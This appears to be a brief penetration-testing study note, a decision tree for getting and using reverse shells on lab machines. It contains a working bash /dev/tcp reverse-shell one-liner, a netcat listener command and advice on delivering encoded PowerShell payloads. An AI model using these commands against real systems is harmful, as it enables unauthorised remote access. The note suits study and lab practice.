# Shells & Payloads — Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for reverse shells and shell delivery.

---

### Got code execution, need a reverse shell
→ Linux target: `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"`, URL-encode it if going through a web parameter
→ Windows target: PowerShell one-liner, base64-encode with Unicode first, deliver via `powershell -enc`
→ Always start the listener (`nc -nvlp <port>`) *before* triggering
→ See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (Linux) and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (Windows)
→ Generalized command reference: [[Linux Methodology#Step 2: Shells & Payloads|Linux]] / [[Windows Methodology#Step 2: Shells & Payloads|Windows]]

### Reverse shell landed
→ Immediately check `whoami` / `id` and `sudo -l` (Linux) or `whoami /priv` (Windows) before assuming you need to escalate. Web server processes on training VMs are often already root/SYSTEM

### `python3 -m http.server` isn't serving the file you expect (404s, or netcat never catches anything)
→ It serves whatever directory it was launched from. `cd` into the exact folder immediately before starting it, and check the server's own access log for a `200` before assuming the listener is broken
→ Full story: [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3 troubleshooting box]]
